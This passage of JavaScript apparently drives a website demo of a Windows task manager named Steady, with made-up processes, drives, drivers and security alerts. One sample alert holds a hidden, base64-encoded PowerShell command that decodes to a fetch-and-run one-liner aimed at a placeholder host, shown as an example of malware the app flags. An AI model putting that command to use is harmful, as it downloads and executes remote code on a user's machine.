// A working copy of the Steady window for the Programs section: every page, live made-up data, and the
// same rules the real app follows (impact rating, gentle re-sorting that holds still under the mouse,
// two-click End task, drive scans, driver installs, alert actions). Nothing here touches the visitor's PC.
(function () {
  "use strict";
  var root = document.getElementById("sim");
  if (!root || !root.querySelector || !window.requestAnimationFrame) return;
  var reduce = window.matchMedia && window.matchMedia("(prefers-reduced-motion: reduce)").matches;
  var W = 1220, H = 790, MEM_TOTAL = 31.2 * 1024;
  var CPU_MODEL = "AMD Ryzen 7 7700 8-Core Processor", GPU_MODEL = "NVIDIA GeForce RTX 4070";

  // ---------- helpers ----------
  function $(s, el) { return (el || root).querySelector(s); }
  function $$(s, el) { return Array.prototype.slice.call((el || root).querySelectorAll(s)); }
  function esc(s) { return String(s).replace(/[&<>"]/g, function (c) { return { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" }[c]; }); }
  function clamp(v, a, b) { return Math.max(a, Math.min(b, v)); }
  function pct(v) { return v < 10 ? v.toFixed(1) + "%" : Math.round(v) + "%"; }
  function mb(v) { return v < 1000 ? Math.round(v) + " MB" : (v / 1024).toFixed(v < 10240 ? 2 : 1) + " GB"; }
  function rate(v) { return v < .05 ? "0 MB/s" : v.toFixed(1) + " MB/s"; }
  function gb(v) { return v >= 1000 ? (v / 1024).toFixed(2) + " TB" : v < 1 ? Math.max(1, Math.round(v * 1024)) + " MB" : v.toFixed(1) + " GB"; }
  function mbps(v) { return v >= 1 ? v.toFixed(1) + " Mbps" : Math.round(v * 1000) + " Kbps"; }
  function clock(d) { var h = d.getHours(), m = d.getMinutes(); return (h % 12 || 12) + ":" + (m < 10 ? "0" : "") + m + " " + (h < 12 ? "AM" : "PM"); }
  function ago(min) { return clock(new Date(Date.now() - min * 60000)); }
  function dur(min) { var h = Math.floor(min / 60), m = Math.round(min % 60); return h ? h + "h " + m + "m" : m + "m"; }
  function noise(v) { return v * .7 + (Math.random() - .5) * .6; }

  var P = {
    list: "M8 6h13M8 12h13M8 18h13M3.5 6h.01M3.5 12h.01M3.5 18h.01",
    perf: "M3 6a3 3 0 0 1 3-3h12a3 3 0 0 1 3 3v12a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3zM7 13l2.5-3 3 5 2.5-4 2 2",
    disk: "M2 11a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2v2a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2zM17.5 12h.01",
    sync: "M20 11a8 8 0 0 0-14.9-3M4 4v4h4M4 13a8 8 0 0 0 14.9 3M20 20v-4h-4",
    shield: "M12 3l7 3v6c0 4.5-3 7.5-7 9-4-1.5-7-4.5-7-9V6z",
    pc: "M3 6a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2zM8 20h8M12 16v4",
    gear: "M12 15a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM19.4 15a1.6 1.6 0 0 0 .3 1.8l.1.1a2 2 0 1 1-2.8 2.8l-.1-.1a1.6 1.6 0 0 0-1.8-.3 1.6 1.6 0 0 0-1 1.5V21a2 2 0 1 1-4 0v-.1a1.6 1.6 0 0 0-1-1.5 1.6 1.6 0 0 0-1.8.3l-.1.1a2 2 0 1 1-2.8-2.8l.1-.1a1.6 1.6 0 0 0 .3-1.8 1.6 1.6 0 0 0-1.5-1H3a2 2 0 1 1 0-4h.1a1.6 1.6 0 0 0 1.5-1 1.6 1.6 0 0 0-.3-1.8l-.1-.1a2 2 0 1 1 2.8-2.8l.1.1a1.6 1.6 0 0 0 1.8.3H9a1.6 1.6 0 0 0 1-1.5V3a2 2 0 1 1 4 0v.1a1.6 1.6 0 0 0 1 1.5 1.6 1.6 0 0 0 1.8-.3l.1-.1a2 2 0 1 1 2.8 2.8l-.1.1a1.6 1.6 0 0 0-.3 1.8V9a1.6 1.6 0 0 0 1.5 1H21a2 2 0 1 1 0 4h-.1a1.6 1.6 0 0 0-1.5 1z",
    search: "M11 18a7 7 0 1 0 0-14 7 7 0 0 0 0 14zM20 20l-4-4",
    sort: "M7 20V4M3 8l4-4 4 4M17 4v16M13 16l4 4 4-4",
    pause: "M7 4h3v16H7zM14 4h3v16h-3z",
    play: "M7 4l12 8-12 8z",
    folder: "M3 7a2 2 0 0 1 2-2h4l2 2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z",
    file: "M14 3H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V8zM14 3v5h5",
    trash: "M4 7h16M9 7V4h6v3M6 7l1 13h10l1-13",
    down: "M12 4v11M7 10l5 5 5-5M5 20h14",
    check: "M5 12l5 5 9-10",
    warn: "M12 3l10 18H2zM12 10v4M12 17.5h.01",
    info: "M12 21a9 9 0 1 0 0-18 9 9 0 0 0 0 18zM12 11v5M12 7.5h.01",
    copy: "M9 11a2 2 0 0 1 2-2h7a2 2 0 0 1 2 2v7a2 2 0 0 1-2 2h-7a2 2 0 0 1-2-2zM5 15V6a2 2 0 0 1 2-2h9",
    up: "M12 19V5M5 12l7-7 7 7",
    chev: "M6 9l6 6 6-6",
    lock: "M5 12a1 1 0 0 1 1-1h12a1 1 0 0 1 1 1v8a1 1 0 0 1-1 1H6a1 1 0 0 1-1-1zM8 11V8a4 4 0 0 1 8 0v3",
    cpu: "M7 7h10v10H7zM9 3v4M15 3v4M9 17v4M15 17v4M3 9h4M3 15h4M17 9h4M17 15h4",
    ram: "M3 8h18v8H3zM7 8v8M11 8v8M15 8v8",
    gpu: "M2 7h20v10H2zM9 15a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM16 10h3M16 14h3",
    net: "M4.5 11a11 11 0 0 1 15 0M7.5 14.5a6 6 0 0 1 9 0M12 18h.01",
    audio: "M4 9h4l5-4v14l-5-4H4zM17 9a4 4 0 0 1 0 6",
    bt: "M7 7l10 10-5 5V2l5 5L7 17",
    board: "M4 6a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v12a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2zM8 8h4v4H8zM15 15h1v1h-1z",
    x: "M6 6l12 12M18 6L6 18",
    min: "M5 12h14",
    max: "M6 6h12v12H6z",
    ext: "M14 4h6v6M20 4l-9 9M18 14v5a1 1 0 0 1-1 1H5a1 1 0 0 1-1-1V7a1 1 0 0 1 1-1h5"
  };
  function ic(n) { return '<svg class="i" viewBox="0 0 24 24" aria-hidden="true"><path d="' + P[n] + '"/></svg>'; }
  function img(n) { return '<img src="img/apps/' + n + '.png" alt="" width="22" height="22">'; }

  // ---------- graphs ----------
  var gid = 0;
  function graph(color, cls) {
    var id = "simg" + (++gid);
    return '<svg class="sim-graph ' + (cls || "") + '" viewBox="0 0 100 40" preserveAspectRatio="none" aria-hidden="true">' +
      '<defs><linearGradient id="' + id + '" x1="0" y1="0" x2="0" y2="1"><stop offset="0" stop-color="' + color + '" stop-opacity=".38"/><stop offset="1" stop-color="' + color + '" stop-opacity="0"/></linearGradient></defs>' +
      '<line class="grid" x1="0" x2="100" y1="13.3" y2="13.3"/><line class="grid" x1="0" x2="100" y1="26.6" y2="26.6"/>' +
      '<path class="ar" fill="url(#' + id + ')"/><path class="ln" stroke="' + color + '"/></svg>';
  }
  function plot(svg, arr, max) {
    if (!svg) return;
    var n = arr.length, d = "";
    for (var i = 0; i < n; i++) d += (i ? "L" : "M") + (i * 100 / (n - 1)).toFixed(2) + " " + (40 - clamp(arr[i] / max, 0, 1) * 38).toFixed(2);
    svg.querySelector(".ln").setAttribute("d", d);
    svg.querySelector(".ar").setAttribute("d", d + "L100 40L0 40Z");
  }
  function line2(svg, a, b, max, colA, colB) {
    if (!svg) return;
    var paths = svg.querySelectorAll(".ln");
    [a, b].forEach(function (arr, k) {
      var d = "";
      for (var i = 0; i < arr.length; i++) d += (i ? "L" : "M") + (i * 100 / (arr.length - 1)).toFixed(2) + " " + (40 - clamp(arr[i] / max, 0, 1) * 38).toFixed(2);
      paths[k].setAttribute("d", d);
    });
  }

  // heat behind a value, like Palette.Heat in the app
  function heat(f) {
    if (f < .04) return "transparent";
    f = clamp(f, 0, 1);
    var r = Math.round(255 + (236 - 255) * f), g = Math.round(180 + (96 - 180) * f), b = Math.round(85 + (52 - 85) * f);
    return "rgba(" + r + "," + g + "," + b + "," + (.09 + .55 * f).toFixed(3) + ")";
  }
  var IMPACT = {
    vh: ["Very high", "#ff6b6b", "rgba(255,107,107,.15)"],
    h: ["High", "#ffa24c", "rgba(255,162,76,.13)"],
    m: ["Moderate", "#f2cc60", "rgba(242,204,96,.11)"],
    l: ["Low", "#7d8794", "rgba(255,255,255,.05)"]
  };
  function level(rk) { return rk >= 30 ? "vh" : rk >= 12 ? "h" : rk >= 4 ? "m" : "l"; }

  // ---------- made-up data ----------
  function appList() {
    function A(o) { o.nz = (Math.random() - .5) * .4; return o; }
    return [
      A({ id: "firefox", icon: "firefox", name: "Firefox", co: "Mozilla Corporation", exe: "firefox.exe", path: "C:\\Program Files\\Mozilla Firefox\\firefox.exe", win: true, n: 14, cpu: 23.6, gpu: 9.2, disk: 2.1, mem: 3770, min: 194, pid: 11248 }),
      A({ id: "obs", icon: "obs", name: "OBS Studio", co: "OBS Project", exe: "obs64.exe", path: "C:\\Program Files\\obs-studio\\bin\\64bit\\obs64.exe", win: true, n: 1, cpu: 4.6, gpu: 6.1, disk: 3.4, mem: 412, min: 41, pid: 15872 }),
      A({ id: "discord", icon: "discord", name: "Discord", co: "Discord Inc.", exe: "Discord.exe", path: "C:\\Users\\you\\AppData\\Local\\Discord\\app-1.0.9187\\Discord.exe", win: true, n: 6, cpu: 2.9, gpu: 2.2, disk: .2, mem: 618, min: 312, pid: 9032 }),
      A({ id: "vscode", icon: "vscode", name: "Visual Studio Code", co: "Microsoft Corporation", exe: "Code.exe", path: "C:\\Users\\you\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe", win: true, n: 9, cpu: 1.4, gpu: .4, disk: .1, mem: 934, min: 87, pid: 13660 }),
      A({ id: "steam", icon: "steam", name: "Steam", co: "Valve Corporation", exe: "steam.exe", path: "C:\\Program Files (x86)\\Steam\\steam.exe", win: true, n: 7, cpu: .4, gpu: .3, disk: 0, mem: 388, min: 318, pid: 6340 }),
      A({ id: "notepad", icon: "notepad", name: "Notepad", co: "Microsoft Corporation", exe: "notepad.exe", path: "C:\\Windows\\System32\\notepad.exe", win: true, n: 1, cpu: 0, gpu: 0, disk: 0, mem: 34, min: 9, pid: 16420 }),
      A({ id: "steady", icon: "steady", name: "Steady", co: "Steady", exe: "Steady.exe", path: "C:\\Users\\you\\Apps\\Steady.exe", win: true, n: 1, cpu: .2, gpu: .1, disk: 0, mem: 96, min: 12, pid: 17204, self: true }),
      A({ id: "onedrive", icon: "onedrive", name: "Microsoft OneDrive", co: "Microsoft Corporation", exe: "OneDrive.exe", path: "C:\\Users\\you\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe", win: false, n: 1, cpu: 1.1, gpu: 0, disk: 1.6, mem: 164, min: 320, pid: 8456 }),
      A({ id: "nvidia", icon: "nvidia", name: "NVIDIA app", co: "NVIDIA Corporation", exe: "NVIDIA app.exe", path: "C:\\Program Files\\NVIDIA Corporation\\NVIDIA app\\CEF\\NVIDIA app.exe", win: false, n: 4, cpu: .6, gpu: .5, disk: 0, mem: 236, min: 321, pid: 5120 }),
      A({ id: "webview", icon: "edge", name: "Microsoft Edge WebView2", co: "Microsoft Corporation", exe: "msedgewebview2.exe", path: "C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\msedgewebview2.exe", win: false, n: 5, cpu: .7, gpu: .2, disk: 0, mem: 141, min: 300, pid: 10716 }),
      A({ id: "pwsh", icon: "powershell", name: "Windows PowerShell", co: "Microsoft Corporation", exe: "powershell.exe", path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", win: false, n: 1, cpu: 0, gpu: 0, disk: 0, mem: 58, min: 140, pid: 7712 }),
      A({ id: "phonelink", icon: "explorer", name: "Phone Link", co: "Microsoft Corporation", exe: "PhoneExperienceHost.exe", path: "C:\\Program Files\\WindowsApps\\Microsoft.YourPhone\\PhoneExperienceHost.exe", win: false, n: 1, cpu: .3, gpu: 0, disk: 0, mem: 122, min: 322, pid: 4980, helper: true })
    ];
  }

  // Storage: sizes in GB. Kinds decide the note and the action, like StorageRules in the app.
  var nid = 0;
  function D(n, kids, o) { o = o || {}; o.id = "n" + (++nid); o.n = n; o.k = o.k || "dir"; o.kids = kids; return o; }
  function F(n, s, o) { o = o || {}; o.id = "n" + (++nid); o.n = n; o.s = s; o.k = o.k || "file"; return o; }
  function game(n, total, big) {
    var rest = total - big.reduce(function (t, f) { return t + f[1]; }, 0);
    return D(n, big.map(function (f) { return F(f[0], f[1], { k: "gamefile", game: n }); }).concat([F("Other game files", rest, { k: "gamefile", game: n, many: true })]), { k: "game", game: n });
  }
  function driveC() {
    return D("C:", [
      D("Users", [D("you", [
        D("Videos", [
          D("Captures", [F("Lake trip 4K.mp4", 9.6, { m: 34 }), F("Gameplay 2026-10-03.mp4", 7.8, { m: 29 }), F("Gameplay 2026-10-19.mp4", 6.3, { m: 13 }), F("Birthday 2026.mp4", 4.1, { m: 120 })]),
          F("Holiday.mp4", 3.8, { m: 210, dup: "Holiday (1).mp4" }), F("Holiday (1).mp4", 3.8, { m: 210, dup: "Holiday.mp4" })
        ]),
        D("Downloads", [F("ubuntu-24.04.3-desktop-amd64.iso", 6.2, { m: 5, dup: "Documents\\ISO" }), F("old-laptop-backup.zip", 7.4, { m: 61 }), F("blender-4.2-windows-x64.msi", .38, { m: 40 }), F("GeForce-612.30-desktop.exe", .87, { m: 59 })]),
        D("Documents", [D("ISO", [F("ubuntu-24.04.3-desktop-amd64.iso", 6.2, { m: 5, dup: "Downloads" })]), D("Projects", [F("render-final.mov", 9.1, { m: 3 }), F("site-assets.psd", 1.2, { m: 3 })])]),
        D("AppData", [D("Local", [D("Temp", [F("Temporary files", 3.2, { k: "temp", many: true })], { k: "tempdir" }), F("NVIDIA shader cache", 6.1, { k: "cache", many: true }), F("Browser caches", 4.4, { k: "cache", many: true }), F("Other app data", 18.7, { k: "appdata", many: true })], { k: "appdata" }), F("Roaming", 8.1, { k: "appdata", many: true })], { k: "appdata" }),
        F("Pictures", 21.6, { k: "folder" }), F("Music", 6.4, { k: "folder" }), F("Desktop", 2.1, { k: "folder" })
      ], { k: "userroot" })], { k: "userroot" }),
      D("Program Files (x86)", [D("Steam", [D("steamapps", [D("common", [
        game("Starfield", 118.4, [["Starfield - Textures01.ba2", 36.8], ["Starfield - Textures02.ba2", 31.2]]),
        game("Baldur's Gate 3", 122.0, [["Textures.pak", 19.2], ["VirtualTextures_1.pak", 14.6]]),
        game("Counter-Strike 2", 34.6, [["pak01_000.vpk", 4.1]])
      ], { k: "steamlib" })], { k: "steamlib" })], { k: "steamlib" }), F("Microsoft", 4.2, { k: "pf", many: true })], { k: "pfdir" }),
      D("Program Files", [F("WindowsApps", 47.0, { k: "sys", many: true, why: "Microsoft Store apps. Windows manages this folder." }), F("NVIDIA Corporation", 8.4, { k: "pf", many: true }), F("Common Files", 5.0, { k: "pf", many: true }), F("obs-studio", .5, { k: "pf", many: true }), F("Mozilla Firefox", .3, { k: "pf", many: true })], { k: "pfdir" }),
      F("Windows", 37.9, { k: "sys", many: true, why: "Windows itself. Steady never deletes anything in here." }),
      F("ProgramData", 9.8, { k: "pf", many: true }),
      F("pagefile.sys", 24.0, { k: "sys", why: "Windows' virtual memory file. You can resize it in Settings › System › About › Advanced system settings › Performance." }),
      F("hiberfil.sys", 12.4, { k: "sys", why: "Lets your PC hibernate. Turn hibernation off in Windows to remove it." }),
      F("System & protected files", 41.0, { k: "virt", why: "Restore points, Windows internals and folders Steady can't open. Settings › System › Storage can clean up some of it." })
    ]);
  }
  function driveD() {
    return D("D:", [
      D("SteamLibrary", [D("steamapps", [D("common", [
        game("Microsoft Flight Simulator 2024", 162.0, [["Content.pak", 48.3]]),
        game("Forza Horizon 5", 133.1, [["media.zip", 22.4]]),
        game("Red Dead Redemption 2", 121.4, [["textures_0.rpf", 18.6]]),
        game("Cyberpunk 2077", 71.2, [["basegame_4_gamedata.archive", 12.9]])
      ], { k: "steamlib" })], { k: "steamlib" })], { k: "steamlib" }),
      D("Recordings", [F("Clip 2026-10-30.mp4", 2.1, { m: 2 }), F("Clip 2026-10-28.mp4", 1.7, { m: 4 }), F("Stream VOD 2026-09.mkv", 31.5, { m: 52 }), F("Stream VOD 2026-08.mkv", 12.8, { m: 80 })]),
      F("System Volume Information", 1.1, { k: "sys", why: "Windows keeps restore data here." })
    ]);
  }
  function size(n) { if (n.kids) n.s = n.kids.reduce(function (t, c) { return t + (c.gone ? 0 : size(c)); }, 0); return n.s; }
  function files(n, path, out) {
    (n.kids || []).forEach(function (c) {
      if (c.gone) return;
      if (c.kids) files(c, path + "\\" + c.n, out);
      else if (!c.many && c.k !== "folder" && c.k !== "virt") out.push({ node: c, path: path });
    });
    return out;
  }

  function driverList() {
    var now = new Date();
    return [
      { id: "gpu", ic: "gpu", name: GPU_MODEL, cat: "Graphics", maker: "NVIDIA", have: "612.30", haveSub: "Sep 2, 2026  ·  32.0.16.1230", latest: "617.42", latestSub: "NVIDIA  ·  Oct 6, 2026", st: "upd", note: "Game Ready Driver 617.42 (873 MB). Steady downloads NVIDIA's official installer, checks NVIDIA's signature, then opens it." },
      { id: "chip", ic: "cpu", name: "AMD Chipset Software", cat: "Chipset", maker: "AMD", have: "7.06.02.123", haveSub: "", latest: "On AMD's website", latestSub: "AMD doesn't offer an automatic version check", st: "maker", act: "Get from AMD" },
      { id: "lan", ic: "net", name: "Realtek Gaming 2.5GbE Family Controller", cat: "Network", maker: "Realtek", have: "10.72.0524.2025", haveSub: "May 24, 2025", latest: "Nothing newer on Windows Update", latestSub: "the maker's site sometimes has newer versions", st: "ok2", act: "ASUS drivers", note: "Built into your ASUS TUF GAMING B650-PLUS WIFI — its newest drivers are on the board maker's support page." },
      { id: "wifi", ic: "net", name: "MediaTek Wi-Fi 6E MT7922 160MHz Wireless LAN Card", cat: "Wi-Fi", maker: "MediaTek, Inc.", have: "3.4.0.1103", haveSub: "Mar 11, 2025", latest: "Nothing newer on Windows Update", latestSub: "the maker's site sometimes has newer versions", st: "ok2", act: "ASUS drivers" },
      { id: "hda", ic: "audio", name: "NVIDIA High Definition Audio", cat: "Audio", maker: "NVIDIA", have: "1.4.3.2", haveSub: "Jun 18, 2026", latest: "Comes with the NVIDIA driver", latestSub: "updated together with your graphics driver", st: "withgpu" },
      { id: "bt", ic: "bt", name: "MediaTek Bluetooth Adapter", cat: "Bluetooth", maker: "MediaTek, Inc.", have: "1.1037.0.395", haveSub: "Feb 6, 2025", latest: "Nothing newer on Windows Update", latestSub: "the maker's site sometimes has newer versions", st: "ok2", act: "ASUS drivers" },
      { id: "bios", ic: "board", name: "BIOS · ASUS TUF GAMING B650-PLUS WIFI", cat: "Motherboard", maker: "ASUS", have: "3201", haveSub: "Aug 14, 2026", latest: "On ASUS's website", latestSub: "BIOS versions aren't published in a way apps can read", st: "maker", act: "Open ASUS support", note: "BIOS updates are installed from the BIOS itself (ASUS calls it EZ Flash). Steady never flashes firmware — that's too risky to do automatically." }
    ].map(function (d) { d.checked = now; return d; });
  }

  function alertList() {
    var payload = "iex (iwr -UseBasicParsing 'https://cdn-update.example/a.ps1')";
    return [
      { id: "ps", sev: "high", title: "Hidden or encoded script running", body: "PowerShell is running with an encoded (scrambled) command. This is one of the most common ways malware secretly downloads and runs code.", who: "powershell.exe", pid: 7316, path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", found: 2, code: "\"powershell.exe\" -NoProfile -WindowStyle Hidden -EncodedCommand aQBlAHgAIAAoAGkAdwByACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgACcAaAB0AHQAcABzADoALwAvAGMAZABuAC0AdQBwAGQAYQB0AGUALgBlAHgAYQBtAHAAbABlAC8AYQAuAHAAcwAxACcAKQA=\n\nDecoded, it actually runs:\n" + payload, open: true },
      { id: "helper", sev: "high", title: "Unsigned program in a hiding spot", body: "“updater-helper.exe” isn't digitally signed and is running from a temporary folder. Real programs normally live in Program Files — malware likes these folders because they don't need admin rights.", who: "updater-helper.exe", pid: 9120, path: "C:\\Users\\you\\AppData\\Local\\Temp\\nsq4A1.tmp\\updater-helper.exe", found: 3, pub: "Not digitally signed", scan: true, threat: true, open: true },
      { id: "clip", sev: "low", title: "Unsigned background program", body: "“clipsync.exe” isn't digitally signed and is running in the background from your user folders. Lots of small apps are unsigned, so this is just so you know it's there.", who: "clipsync.exe", pid: 4410, path: "C:\\Users\\you\\AppData\\Roaming\\ClipSync\\clipsync.exe", found: 40, pub: "Not digitally signed", scan: true },
      { id: "old", sev: "low", title: "Startup entry points to a missing file", body: "“OldUpdater” tries to start a program that no longer exists. It's harmless leftover clutter from an uninstalled app — you can turn it off in Startup apps.", who: "Startup: HKCU Run  ·  “OldUpdater”", path: "C:\\Users\\you\\AppData\\Local\\OldUpdater\\update.exe", found: 40, startup: true }
    ];
  }

  function specs() {
    return [
      { t: "This PC", ic: "pc", s: "Windows 11 Home", rows: [["Device name", "DESKTOP-K4M2R7Q"], ["Made by", "ASUSTeK COMPUTER INC."], ["Windows", "Windows 11 Home  (25H2)"], ["Build", "26200.7171  ·  64-bit"], ["Installed", "March 2, 2026"], ["Signed in as", "you"], ["Firmware", "UEFI"], ["Secure Boot", "On"]] },
      { t: "Processor", ic: "cpu", s: CPU_MODEL, rows: [["Model", CPU_MODEL], ["Cores", "8 cores  ·  16 threads"], ["Base speed", "3.80 GHz"], ["L2 cache", "8 MB"], ["L3 cache", "32 MB"], ["Socket", "AM5"], ["Virtualization", "Enabled"]] },
      { t: "Memory", ic: "ram", s: "32.0 GB", rows: [["Installed", "32.0 GB"], ["Usable", "31.2 GB"], ["Speed", "6000 MT/s"], ["Type", "DDR5"], ["Slots used", "2 of 4"], ["#", "Modules"], ["DIMM A2", "16 GB  ·  Kingston FURY Beast"], ["DIMM B2", "16 GB  ·  Kingston FURY Beast"]] },
      { t: "Motherboard & BIOS", ic: "board", s: "TUF GAMING B650-PLUS WIFI", rows: [["Board", "ASUSTeK COMPUTER INC. TUF GAMING B650-PLUS WIFI"], ["Revision", "Rev 1.xx"], ["BIOS version", "3201"], ["BIOS date", "August 14, 2026"], ["BIOS maker", "American Megatrends Inc."]] },
      { t: "Audio devices", ic: "audio", s: "3 devices", rows: [["Device", "NVIDIA High Definition Audio"], ["Device", "Realtek USB Audio"], ["Device", "Steam Streaming Speakers"]] },
      { t: "Graphics", ic: "gpu", s: GPU_MODEL, right: true, rows: [["GPU", GPU_MODEL], ["Video memory", "12.0 GB"], ["Driver", "32.0.16.1230  ·  September 2, 2026"], ["Running at", "2560 × 1440 @ 165 Hz"]] },
      { t: "Displays", ic: "pc", s: "2 displays", right: true, rows: [["Display 1", "Dell S2721DGF  ·  27\"  ·  DEL"], ["Display 2", "LG 24GN600  ·  24\"  ·  GSM"]] },
      { t: "Storage", ic: "disk", s: "2 drives · 2.75 TB", right: true, rows: [["Drive", "Samsung SSD 990 PRO 2TB  ·  1.82 TB  ·  NVMe SSD"], ["Drive", "WD_BLACK SN770 1TB  ·  931.5 GB  ·  NVMe SSD"], ["#", "Space"], ["bar:C:", "c"], ["bar:D: Games", "d"]] },
      { t: "Network", ic: "net", s: "1 connection", right: true, rows: [["Adapter", "Realtek Gaming 2.5GbE Family Controller"], ["Link speed", "2.5 Gbps"], ["IPv4 address", "192.168.1.24"], ["MAC address", "A8:5E:45:3C:91:0D"]] }
    ];
  }

  // ---------- state ----------
  var S, apps, hist, sys, drives, drivers, alerts, timers = [];
  function later(fn, ms) { var t = setTimeout(fn, ms); timers.push(t); return t; }
  function reset() {
    timers.forEach(clearTimeout); timers = [];
    S = { page: "programs", speed: 1, reorder: 5, hideIdle: true, helpers: false, frozen: false, hover: false, sort: "impact", q: "", sinceSort: 0, popups: true, autoUpd: true, widget: true, perm: false, view: "folders", drive: "C", scanned: {}, scanning: null, trusted: [], binItems: 212, open: {} };
    apps = appList();
    drives = { C: { root: driveC(), total: 1863, label: "Local Disk", sys: true, path: [], held: 1.4 }, D: { root: driveD(), total: 931.5, label: "Games", path: [], held: 0 } };
    drivers = driverList();
    alerts = alertList();
    hist = { cpu: [], mem: [], gpu: [], dc: [], dd: [], down: [], up: [], cores: [] };
    for (var i = 0; i < 16; i++) hist.cores.push([]);
    sys = { cpu: 0, mem: 0, gpu: 0, cores: [], read: 0, write: 0, dc: 0, dd: 0, down: 0, up: 0, share: 86, uptime: 323 * 60 };
    for (var k = 0; k < 60; k++) step(1);
  }

  function step(dt) {
    var tot = 0, gsum = 0, dsum = 0, msum = 0;
    apps.forEach(function (a) {
      if (a.ended) return;
      a.nz = noise(a.nz);
      var surge = a.id === "firefox" && Math.random() < .07 ? 1.55 : 1;
      var cpu = Math.max(0, a.cpu * (1 + .3 * a.nz) * surge), gpu = Math.max(0, a.gpu * (1 + .22 * a.nz));
      var disk = a.disk ? a.disk * (Math.random() < .25 ? 1.7 : .35 + Math.random() * .9) : (Math.random() < .03 ? .2 : 0);
      a.m = a.mem * (1 + .012 * a.nz);
      if (a.c == null) { a.c = cpu; a.g = gpu; a.d = disk; a.rk = 0; a.rc = cpu; a.rg = gpu; a.rd = disk; }
      var aD = 1 - Math.exp(-dt / 2), aR = 1 - Math.exp(-dt / 8);
      a.c += (cpu - a.c) * aD; a.g += (gpu - a.g) * aD; a.d += (disk - a.d) * aD;
      a.rc += (cpu - a.rc) * aR; a.rg += (gpu - a.rg) * aR; a.rd += (disk - a.rd) * aR;
      var raw = cpu + gpu * .6 + a.m * 100 / MEM_TOTAL * .8 + Math.min(disk, 50) * .3;
      a.rk = a.rk ? a.rk + (raw - a.rk) * aR : raw;
      if (a.c >= .5 || a.g >= 1 || a.m >= 100 || a.d >= .5) a.busy = 0; else a.busy = (a.busy || 0) + dt;
      if (!a.helper || S.helpers) { tot += cpu; gsum += gpu; dsum += disk; msum += a.m; }
    });
    sys.nz = noise(sys.nz || 0);
    var winCpu = 6.4 + 1.6 * sys.nz;
    sys.cpu = clamp(tot + winCpu, 1, 100);
    sys.share = Math.round(tot * 100 / (tot + winCpu));
    sys.cores = [];
    for (var i = 0; i < 16; i++) { var c = clamp(sys.cpu * (.55 + Math.random() * .9) + (i === 3 ? 18 : 0), 2, 99); sys.cores.push(c); push(hist.cores[i], c); }
    sys.mem = msum + 10950 + 60 * sys.nz;
    sys.gpu = clamp(gsum * 1.1 + 13 + 2 * sys.nz, 0, 100);
    sys.read = dsum * .18 + Math.random() * .4; sys.write = dsum * .9 + Math.random() * 1.2;
    sys.dc = clamp(dsum * 1.05 + Math.random() * 2.4, 0, 100);
    sys.dd = Math.random() < .2 ? Math.random() * 4 : Math.random() * .6;
    sys.down = clamp(1.8 * (.6 + Math.random()) + (apps[2].ended ? 0 : .6), 0, 50); sys.up = .31 * (.6 + Math.random());
    sys.mhz = 5180 + Math.round((Math.random() - .5) * 120);
    sys.uptime += dt;
    push(hist.cpu, sys.cpu); push(hist.mem, sys.mem * 100 / MEM_TOTAL); push(hist.gpu, sys.gpu); push(hist.dc, sys.dc); push(hist.dd, sys.dd); push(hist.down, sys.down); push(hist.up, sys.up);
    S.sinceSort += dt;
  }
  function push(arr, v) { arr.push(v); if (arr.length > 60) arr.shift(); }

  // ---------- frame ----------
  var NAV = [["programs", "list", "Programs"], ["performance", "perf", "Performance"], ["storage", "disk", "Storage"], ["drivers", "sync", "Drivers"], ["alerts", "shield", "Alerts"], ["mypc", "pc", "My PC"]];
  function frame() {
    root.innerHTML =
      '<div class="sim-win" role="application" aria-label="A working demo of the Steady app with made-up data">' +
      '<div class="sim-title"><img src="img/apps/steady.png" alt="">Steady<div class="caps"><span>' + ic("min") + '</span><span>' + ic("max") + '</span><span>' + ic("x") + '</span></div></div>' +
      '<div class="sim-body"><aside class="sim-side">' +
      '<div class="sim-brand"><img src="img/apps/steady.png" alt=""><div><b>Steady</b><small>Calm task manager</small></div></div>' +
      '<div class="sim-menu">Menu</div><nav class="sim-nav" aria-label="Steady pages">' +
      NAV.map(function (n) { return '<button type="button" data-go="' + n[0] + '">' + ic(n[1]) + '<span>' + n[2] + '</span>' + (n[0] === "alerts" ? '<span class="sim-badge" data-k="badge"></span>' : "") + "</button>"; }).join("") +
      '</nav><div class="sim-foot"><div class="sim-foot-row"><button type="button" class="sim-set" data-go="settings">' + ic("gear") + '<span>Settings</span></button>' +
      '<button type="button" class="sim-upd" data-act="update" title="Steady 1.2.1 — click to check for updates" aria-label="Check for updates">' + ic("sync") + "</button></div>" +
      '<div class="sim-meters">' + meter("CPU", "cpu", "var(--s-cpu)") + meter("Memory", "mem", "var(--s-mem)") + meter("GPU", "gpu", "var(--s-gpu)") + "</div></div></aside>" +
      '<main class="sim-main" data-k="main"></main></div>' +
      '<div class="sim-toast" data-k="toast" role="status" aria-live="polite"><b></b><p></p></div></div>';
  }
  function meter(label, k, c) { return '<div class="sim-meter"><div><span>' + label + '</span><b data-k="m-' + k + '"></b></div><div class="sim-bar" style="--c:' + c + '"><i data-k="mb-' + k + '"></i></div></div>'; }
  function updFrame() {
    var memP = sys.mem * 100 / MEM_TOTAL;
    set("m-cpu", pct(sys.cpu)); set("m-mem", Math.round(memP) + "% in use"); set("m-gpu", pct(sys.gpu));
    width("mb-cpu", sys.cpu); width("mb-mem", memP); width("mb-gpu", sys.gpu);
    var n = alerts.filter(function (a) { return a.sev === "high" && !a.done; }).length, b = $('[data-k="badge"]');
